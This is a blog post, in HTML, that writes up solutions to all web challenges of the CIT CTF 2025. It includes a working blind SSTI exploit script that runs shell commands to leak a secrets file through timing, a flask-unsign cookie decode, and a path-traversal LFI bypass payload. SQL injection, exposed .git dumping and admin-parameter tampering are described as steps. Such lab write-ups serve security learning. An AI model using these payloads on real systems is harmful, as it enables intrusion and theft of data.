<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Hi, I&#39;m Khaled, a cybersecurity engineer passionate about offensive security, software development, and DevSecOps. I specialize in penetration testing, bug bounty hunting, vulnerability research, and security automation. Through my blog, I share practical security knowledge, CTF writeups, tool development insights, and challenge walkthroughs to help the cybersecurity community learn and grow. When I&#39;m not breaking things, I&#39;m building security tools in Rust and Python, contributing to open source projects, and mentoring aspiring security professionals.">
    <meta name="keywords" content="cybersecurity, penetration testing, bug bounty, security research, vulnerability assessment, ethical hacking, security automation, CTF competitions, offensive security, mindpatch">
    <meta name="author" content="Khaled Nassar">

    <title>[CIT CTF 2025] Solving all Web challenges - @MindPatch</title>

    <link rel="stylesheet" href="/css/style.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/asciinema-player@3.7.0/dist/bundle/asciinema-player.min.css">

    

    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">

    
    <script type="module">
        import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';

        mermaid.initialize({
            startOnLoad: false,
            theme: 'dark',
            themeVariables: {
                darkMode: true,
                background: '#1a1a1a',
                primaryColor: '#555',
                primaryTextColor: '#e0e0e0',
                primaryBorderColor: '#666',
                lineColor: '#999',
                secondaryColor: '#444',
                tertiaryColor: '#333',
                primaryBorderColor: '#666',
                fontSize: '16px',
                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
            }
        });

        
        document.addEventListener('DOMContentLoaded', function() {
            
            document.querySelectorAll('pre code, pre.mermaid').forEach((element) => {
                const code = element.textContent.trim();

                
                const isMermaid = code.match(/^(graph|flowchart|sequenceDiagram|classDiagram|stateDiagram|erDiagram|journey|gantt|pie|gitGraph|mindmap|timeline|quadrantChart|requirementDiagram|C4Context)/);

                if (isMermaid || element.classList.contains('language-mermaid') || element.getAttribute('data-lang') === 'mermaid') {
                    const pre = element.tagName === 'PRE' ? element : element.parentElement;

                    
                    const div = document.createElement('div');
                    div.className = 'mermaid';
                    div.textContent = code;

                    
                    if (pre.parentElement) {
                        pre.parentElement.replaceChild(div, pre);
                    }
                }
            });

            
            mermaid.run();
        });
    </script>
</head>
<body>
    <header>
    <a href="/" class="site-logo">@MindPatch</a>
    <nav>
        
        <a href="/about">about</a>
        
        <a href="/posts">blog</a>
        
        <a href="/projects/">projects</a>
        
        <a href="/index.xml">rss</a>
    </nav>
</header>


    <main>
        
<div class="post-layout">
    <article class="post-article">
        <div class="post-header">
            <h1>[CIT CTF 2025] Solving all Web challenges</h1>
            <div class="post-meta">
                <span class="post-date">2025-04-28</span>
                
                <span class="post-tags">
                    
                    <a href="/tags/ctf" data-tippy-content="View all posts tagged with CTF">#CTF</a>
                    
                    <a href="/tags/web-security" data-tippy-content="View all posts tagged with web security">#web security</a>
                    
                    <a href="/tags/ssti" data-tippy-content="View all posts tagged with SSTI">#SSTI</a>
                    
                    <a href="/tags/lfi" data-tippy-content="View all posts tagged with LFI">#LFI</a>
                    
                    <a href="/tags/sql-injection" data-tippy-content="View all posts tagged with SQL injection">#SQL injection</a>
                    
                    <a href="/tags/git-enumeration" data-tippy-content="View all posts tagged with git enumeration">#git enumeration</a>
                    
                    <a href="/tags/flask" data-tippy-content="View all posts tagged with flask">#flask</a>
                    
                </span>
                
            </div>
        </div>

        <div class="post-content">
            <p>Hello, I joined the CTF for fun during the weekend.</p>
<p>I focused on web challenges and completed all challenges in this category. The challenges were straightforward and made for a fun weekend.</p>
<h2 id="mr-chatbot">Mr. Chatbot</h2>
<p><img src="https://miro.medium.com/v2/resize:fit:952/1*kvW3lucpnNq6fTtQ9Y_BBA.png" alt="Mr. Chatbot Challenge"></p>
<p>The application shows a welcome page asking for your name, then puts you in a chat with a bot. The goal was to get the Flag from the bot. This wasn&rsquo;t an LLM attack — responses came from JavaScript files.</p>
<p><img src="https://miro.medium.com/v2/resize:fit:952/1*RXw88Zwtk6JNglc_pSVzTQ.png" alt="Chat Interface"></p>
<p>After entering a name, you get a session value that can be decoded with flask-unsign:</p>
<pre><code class="language-bash">$ flask-unsign --unsign --cookie &quot;eyJhZG1pbiI6IjAiLCJuYW1lIjoiaGFja2VyIn0.aA8u-Q.GRwPzCvfn4k_zUDDzo_XL83fKJk&quot; --secret=&quot;9f3IC3uj9^zZ&quot;
[*] Session decodes to: {'admin': '0', 'name': 'hacker'}
</code></pre>
<p><img src="https://miro.medium.com/v2/resize:fit:952/1*lZwyPZ9_OqenlmQWuCAssg.png" alt="Session Decoding"></p>
<p>After trying injections with no luck, I did parameter fuzzing and found the <code>admin=1</code> parameter. This revealed new session data:</p>
<p><img src="https://miro.medium.com/v2/resize:fit:667/1*1TuqK6xE0XGYJz-DQD50oQ.png" alt="Admin Parameter"></p>
<pre><code class="language-bash">$ flask-unsign --unsign --cookie &quot;.eJwdzE0LgjAAxvHvsksEHVoJUdEpe7M2C2S63cyJTacIFprRd--x2397ftuHxLo0FVkRSiakissUmT6TOm6aVo_G63GGO43tZTSmy0xM5XvZyoj3enarzkFjzqF-3ENRSCNz1heL6PiwzHaO7LMaXfJ956hwn6QHUVzQfqDQrL3SbjpYTmFzL0ndguKc822NfUe5Haz2omPWMfpvGJsrtAoEzMmBNwpOuXZ4M4d1fAEb_v-be4b1ftBsyPcHZ6hN0g.aAwwvA.ouiTuVJ131_fQmyqYgewMTM-ZlM&quot; --secret=&quot;9f3IC3uj9^zZ&quot;
[*] Session decodes to: {'admin': '1', 'name': &quot;hacker&quot;, 'uid': 'L2V0Yy9wYXNzd2QnKTsiKWdhbWVkYiYjMzk7XHhlMlx4YzgpXHhmNFx4ZWFceGVkLFx4OTZceGMwP1x0XHhlN1x4YjJceDk1XHhjNCpceGE1Nlx4OTdJXHgxM1x4OTdceDljZ1x4ZTVceGI4XHhiZlx4ZDlceGE3XHg4OVx4OWJceDk3JiMzOTs='}
</code></pre>
<p>As you see there&rsquo;s a new variable (<strong>UID</strong>), I tried doing some injections like SSTI and got it :)</p>
<p><img src="https://miro.medium.com/v2/resize:fit:667/1*GdcyUtROwNfXlDF7_ViIVw.png" alt="SSTI Success"></p>
<p>Well The idea now to get <strong>secrets.txt</strong> file blindly, I wrote a script that uses <strong>head</strong> command if char is valid then sleep 5 seconds</p>
<pre><code class="language-python">import requests
import string
import time

CHARS = string.printable
FOUND = &quot;&quot;
POSITION = len(FOUND) + 1

def make_payload(position, the_char):
    # Use a simple command to compare single character
    cmd = f'[ &quot;$(head -c {position} secrets.txt | tail -c 1)&quot; = &quot;{the_char}&quot; ] &amp;&amp; sleep 5'
    payload = &quot;{{ self.__init__.__globals__.__builtins__.__import__('os').popen('&quot;+cmd+&quot;').read() }}&quot;
    return payload

def exploit():
    global FOUND, POSITION
    
    # Continue until we've found enough characters or need to stop
    max_positions = 100  # Set a reasonable limit
    consecutive_spaces = 0  # Track consecutive spaces to detect end of file
    
    while POSITION &lt;= max_positions and consecutive_spaces &lt; 5:  # Stop after 5 consecutive spaces
        found_char = False
        
        for ch in CHARS:
            if ch in ['&quot;', '\\', '`', '$', '&amp;', '|', ';', '\n', '\r']:  # Skip problematic chars
                continue
                
            print(f&quot;Position {POSITION}, trying character: {ch}&quot;)
            start_time = time.time()
            
            try:
                r = requests.post(
                    &quot;http://23.179.17.40:58005/&quot;, 
                    allow_redirects=False, 
                    data={&quot;name&quot;: make_payload(POSITION, ch), &quot;admin&quot;: &quot;1&quot;},
                    proxies={&quot;http&quot;: &quot;http://localhost:8080&quot;},
                    timeout=10
                )
                
                elapsed_time = time.time() - start_time
                
                if elapsed_time &gt;= 4.5:  # Slightly lower threshold to account for network variability
                    FOUND += ch
                    found_char = True
                    
                    # Reset consecutive spaces counter if we found a non-space
                    if ch != ' ':
                        consecutive_spaces = 0
                    else:
                        consecutive_spaces += 1
                        
                    print(f&quot;Found character at position {POSITION}: {ch}&quot;)
                    print(f&quot;Current secret: {FOUND}&quot;)
                    break
                    
            except requests.exceptions.Timeout:
                # If timeout occurs, the character matched
                FOUND += ch
                found_char = True
                
                # Reset consecutive spaces counter if we found a non-space
                if ch != ' ':
                    consecutive_spaces = 0
                else:
                    consecutive_spaces += 1
                    
                print(f&quot;Found character at position {POSITION} (timeout): {ch}&quot;)
                print(f&quot;Current secret: {FOUND}&quot;)
                break
                
            except Exception as e:
                print(f&quot;Error with character {ch} at position {POSITION}: {e}&quot;)
        
        if not found_char:
            FOUND += &quot; &quot;
            consecutive_spaces += 1
            print(f&quot;No character found at position {POSITION}, adding space and continuing&quot;)
            print(f&quot;Current secret: {FOUND}&quot;)
            print(f&quot;Consecutive spaces: {consecutive_spaces}&quot;)
        
        POSITION += 1
        
        time.sleep(1)

def main():
    print(f&quot;Starting blind exploitation from existing credentials: {FOUND}&quot;)
    print(f&quot;Starting at position: {POSITION}&quot;)
    exploit()
    print(f&quot;Final extracted secret: {FOUND}&quot;)

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<p>And after running it got the flag :)</p>
<pre><code class="language-bash">$ python exp.py
admin:9f3IC3uj9^zZ  CIT{18a7fbedb4f3548f}
</code></pre>
<h2 id="how-i-parsed-your-json">How I Parsed your JSON</h2>
<p>This challenge reads JSON files locally and provides a SQL-like syntax to extract data. You can add <code>*</code> to the query to extract all columns.</p>
<p>The useful finding was converting the <code>container</code> parameter into a list with <code>?container[]=</code>. This showed a debug page with source code.</p>
<p><img src="https://miro.medium.com/v2/resize:fit:667/1*HpShJFda_vKXHxW6UGpBfA.png" alt="Debug Page"></p>
<p>The code simply removes <code>../</code> and file extensions from the container name to prevent LFI. This can be bypassed with <code>..//file.txt.txt</code>.</p>
<pre><code>/select?record=*&amp;container=../../../..//app//secrets.txt.txt
</code></pre>
<p><img src="https://miro.medium.com/v2/resize:fit:667/1*KhKFV2iS03LRGP23UU74KA.png" alt="LFI Bypass Result"></p>
<h2 id="commit--order-version-control-unit">Commit &amp; Order: Version Control Unit</h2>
<p>This challenge was straightforward. I discovered an exposed <code>/.git</code> directory on the server and dumped the repository using the git-dump tool.</p>
<p>After examining the commit history, I found older commits that contained the source code with hardcoded admin credentials. This is a common security mistake where developers remove sensitive information in later commits but forget that the data remains accessible in the Git history.</p>
<p>The steps to solve were:</p>
<ol>
<li>Identify the exposed Git repository at <code>/.git</code></li>
<li>Download the repository using git-dump</li>
<li>Review commit history with <code>git log</code></li>
<li>Check older commits with <code>git show [commit-hash]</code></li>
<li>Find the source code file containing the hardcoded admin password in admin.php</li>
<li>Use the credentials to access the admin panel and retrieve the flag</li>
</ol>
<h2 id="breaking-authentication">Breaking Authentication</h2>
<p>This challenge featured a straightforward SQL injection vulnerability in the login page.</p>
<p>Steps to solve:</p>
<ol>
<li>Accessed the database and dumped its contents</li>
<li>Found the flag stored in the &lsquo;secrets&rsquo; table</li>
</ol>
<p>Classic example of an unsanitized input field allowing SQL injection to compromise a web application&rsquo;s authentication mechanism.</p>
<h2 id="keeping-up-with-the-credentials">Keeping Up with the Credentials</h2>
<p>This challenge required first solving another challenge to obtain valid username and password credentials.</p>
<p>Steps to solve:</p>
<ol>
<li>Used credentials obtained from the previous challenge to log in</li>
<li>After login, got redirected to <code>/debug.php</code> which was an empty page</li>
<li>Noticed that accessing <code>/admin.php</code> directly would automatically log you out</li>
<li>Modified the login request to include the parameter <code>admin=true</code> using POST method</li>
<li>Successfully redirected to <code>/admin.php</code> with admin privileges</li>
<li>Retrieved the flag from the admin page</li>
</ol>
<p>Pretty Simple :v</p>

        </div>
    </article>

    
    
    <aside class="toc-sidebar">
        <div class="toc">
            <div class="toc-title">Table of Contents</div>
        </div>
    </aside>
    
</div>

<div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #333;">
    <a href="/posts">← Back to posts</a>
</div>

    </main>

    <footer>
    <p>&copy; 2025 Khaled Nassar</p>
</footer>


    
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/toolbar/prism-toolbar.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/normalize-whitespace/prism-normalize-whitespace.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/tocbot@4.25.0/dist/tocbot.min.js"></script>

    
    <script src="https://unpkg.com/@popperjs/core@2"></script>
    <script src="https://unpkg.com/tippy.js@6"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/fuse.js@7.0.0"></script>

    
    <script src="https://cdn.jsdelivr.net/npm/asciinema-player@3.7.0/dist/bundle/asciinema-player.min.js"></script>

    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            
            Prism.highlightAll();

            
            mediumZoom('article img, .post-content img', {
                margin: 24,
                background: 'rgba(0, 0, 0, 0.9)',
                scrollOffset: 0
            });

            
            renderMathInElement(document.body, {
                delimiters: [
                    {left: '$$', right: '$$', display: true},
                    {left: '$', right: '$', display: false},
                    {left: '\\(', right: '\\)', display: false},
                    {left: '\\[', right: '\\]', display: true}
                ],
                throwOnError: false
            });

            
            if (document.querySelector('.toc')) {
                tocbot.init({
                    tocSelector: '.toc',
                    contentSelector: '.post-content',
                    headingSelector: 'h2, h3, h4',
                    hasInnerContainers: true,
                    collapseDepth: 6,
                    scrollSmooth: true,
                    scrollSmoothDuration: 420,
                    headingsOffset: 40,
                    scrollSmoothOffset: -40,
                    positionFixedSelector: '.toc',
                    fixedSidebarOffset: 'auto',
                    throttleTimeout: 50,
                    includeHtml: false,
                    onClick: function(e) {
                        e.preventDefault();
                        const targetId = e.target.getAttribute('href');
                        const targetElement = document.querySelector(targetId);
                        if (targetElement) {
                            targetElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
                        }
                    }
                });
            }

            
            tippy('[data-tippy-content]', {
                theme: 'custom',
                placement: 'top',
                arrow: true,
                animation: 'scale'
            });

            
            document.querySelectorAll('pre[class*="language-"]').forEach(function(pre) {
                pre.classList.add('line-numbers');
            });
        });
    </script>
</body>
</html>
